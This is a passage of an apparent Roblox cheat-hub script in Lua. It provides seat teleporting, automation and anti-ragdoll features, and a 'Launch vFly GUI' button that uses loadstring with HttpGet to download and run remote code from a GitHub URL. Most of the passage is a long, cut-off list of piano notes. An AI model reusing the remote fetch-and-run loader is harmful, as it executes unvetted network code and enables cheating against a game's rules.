        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Seat") and obj.Name == "Seat" then setupSeat(obj) end
        end
        Workspace.DescendantAdded:Connect(function(obj)
            if obj:IsA("Seat") and obj.Name == "Seat" then setupSeat(obj) end
        end)
    end

    local function sitOnRandomEmptySeat()
        local empty = {}
        for _, seat in pairs(allSeats) do
            if seat and seat.Parent and seat:IsA("Seat") and not seat.Occupant then table.insert(empty, seat) end
        end
        if #empty == 0 then
            PlayErrorSound()
            OrionLib:MakeNotification({ Name = "No Seats", Content = "No empty seats available", Time = 2 })
            return
        end
        local seat = empty[math.random(1, #empty)]
        local char = getPlayerCharacter()
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if hum and root then
                PlayActionSound()
                hum.Sit = false
                task.wait(0.2)
                root.CFrame = seat.CFrame + Vector3.new(0, 3, 0)
                task.wait(0.2)
                seat:Sit(hum)
                OrionLib:MakeNotification({ Name = "Seated", Content = "Sat on a random empty seat", Time = 2 })
            end
        end
    end

    local function startAutomation()
        if AutomationConnection then AutomationConnection:Disconnect() end
        local char = getPlayerCharacter()
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        AutomationConnection = hum.Seated:Connect(function(active, seat)
            if AutomationEnabled then
                task.wait(0.1)
                performAutoAction(active)
            end
        end)
        if AutomationEnabled and hum.SeatPart then performAutoAction(true) end
    end

    local function stopAutomation()
        if AutomationConnection then
            AutomationConnection:Disconnect()
            AutomationConnection = nil
        end
    end

    TrainTab:AddSection({ Name = "Seat Operations" })
    TrainTab:AddButton({ Name = "Sit on Random Empty Seat", Callback = sitOnRandomEmptySeat })

    TrainTab:AddSection({ Name = "Automation Settings" })
    TrainTab:AddToggle({
        Name = "Enable Automation",
        Default = false,
        Callback = function(value)
            AutomationEnabled = value
            if value then
                PlayActionSound()
                startAutomation()
                startSeatDetection()
                OrionLib:MakeNotification({ Name = "Automation ON", Content = "Auto-operates " .. TargetItemName .. " on board/alight", Time = 3 })
            else
                stopAutomation()
                OrionLib:MakeNotification({ Name = "Automation OFF", Content = "Stopped", Time = 2 })
            end
        end
    })

    TrainTab:AddParagraph("Automation Behavior", "On board/alight: Spawn → Hold → Use → Discard " .. TargetItemName .. ". First time only: Also spawns " .. SecondItemName .. ".")

    TrainTab:AddSection({ Name = "PC Useful Features" })
    TrainTab:AddButton({
        Name = "Launch vFly GUI",
        Callback = function()
            PlayActionSound()
            pcall(function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/makkurokurosukescript/VFly-gui/refs/heads/main/VFly%20gui'))()
            end)
        end
    })
    TrainTab:AddParagraph("vFly GUI", "WASD+QE flight, includes Noclip feature.")

    local antiExplosionConn
    local function setupAntiExplosion(char)
        if not char then return end
        local hum = char:WaitForChild("Humanoid", 5)
        if not hum then return end
        local ragdolled = hum:FindFirstChild("Ragdolled")
        if ragdolled and ragdolled:IsA("BoolValue") then
            if antiExplosionConn then antiExplosionConn:Disconnect() end
            antiExplosionConn = ragdolled:GetPropertyChangedSignal("Value"):Connect(function()
                local anchored = ragdolled.Value
                for _, part in ipairs(char:GetChildren()) do
                    if part:IsA("BasePart") then part.Anchored = anchored end
                end
            end)
        end
    end

    task.spawn(function()
        task.wait(1)
        startSeatDetection()
        if AutomationEnabled then startAutomation() end
        if LocalPlayer.Character then setupAntiExplosion(LocalPlayer.Character) end
    end)

    LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(1)
        if AutomationEnabled then startAutomation() end
        setupAntiExplosion(char)
    end)
end

-- ============================================================================
-- Block 33: Sheet Music Tab (Girl A + 공격전이다 + MONTAGEM_HIKARI Default Songs)
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local SH = _G.SH

    local PianoTab = Window:MakeTab({ Name = "Sheet Music", Icon = "rbxassetid://4483362458", PremiumOnly = false })

    local PianoControlSec = PianoTab:AddSection({ Name = "Piano Control" })
    PianoControlSec:AddToggle({ Name = "Enable Piano Feature", Default = false, Callback = _G.togglePiano })
    PianoControlSec:AddToggle({ Name = "Follow Player", Default = true, Callback = function(v)
        SH.PianoConfig.FollowPlayer = v
        if v then PlayActionSound() end
        if SH.PianoConfig.Enabled and SH.PianoConfig.Keyboard and SH.PianoConfig.Keyboard.Parent then
            if v then _G.setupPianoFollow() else _G.stopPiano() end
        elseif SH.PianoConfig.Enabled and v then
            SH.PianoConfig.Keyboard = _G.getMusicKeyboard()
            if SH.PianoConfig.Keyboard then _G.setupPianoFollow() end
        end
    end })

    -- ========================================================================
    -- Default Song: 少女A (Girl A)
    -- ========================================================================
    local DEFAULT_SONG_SHOJO_A = [[
[
  {"key": "Key1Gsharp", "delay": 0},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 1},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 1},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 1},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.125},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2C", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3C", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3C", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Dsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key1G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3C", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.5},
  {"key": "Key2Gsharp", "delay": 0.5},
  {"key": "Key3C", "delay": 1},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.375},
  {"key": "Key2F", "delay": 0.125},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Gsharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.375},
  {"key": "Key2F", "delay": 0.125},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key2Gsharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key1F", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key2Dsharp", "delay": 0.25},
  {"key": "Key1Dsharp", "delay": 0.125},
  {"key": "Key3C", "delay": 0.125},
  {"key": "Key1Dsharp", "delay": 0.25},
  {"key": "Key3Asharp", "delay": 0.25},
  {"key": "Key2Gsharp", "delay": 0.25},
  {"key": "Key3B", "delay": 2.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3A", "delay": 0.625},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3A", "delay": 0.625},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.375},
  {"key": "Key3A", "delay": 0.625},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key1E", "delay": 0.375},
  {"key": "Key2E", "delay": 0.125},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key1D", "delay": 0.25},
  {"key": "Key2Fsharp", "delay": 0.25},
  {"key": "Key1D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Fsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Fsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Fsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2Fsharp", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
